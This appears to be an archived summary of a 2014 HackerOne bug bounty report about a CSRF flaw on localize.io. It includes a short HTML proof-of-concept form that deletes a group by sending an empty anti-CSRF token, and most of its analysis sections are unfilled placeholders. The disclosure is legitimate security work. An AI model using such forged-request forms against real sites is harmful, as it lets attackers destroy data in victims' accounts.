# Group Deletion Via CSRF

## Metadata
- **Source:** HackerOne
- **Report:** 8218 | https://hackerone.com/reports/8218
- **Submitted:** 2014-04-20
- **Reporter:** ajaysinghnegi
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Team,

I have found a CSRF vulnerability using which the attacker can delete a group on any users account as the anti-csrf token is not getting validated on the server-side. 


Group Deletion Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Team,

I have found a CSRF vulnerability using which the attacker can delete a group on any users account as the anti-csrf token is not getting validated on the server-side. 


Group Deletion Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="deleteGroup[id]" value="140" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


</details>

---
*Analysed by Claude on 2026-05-24*
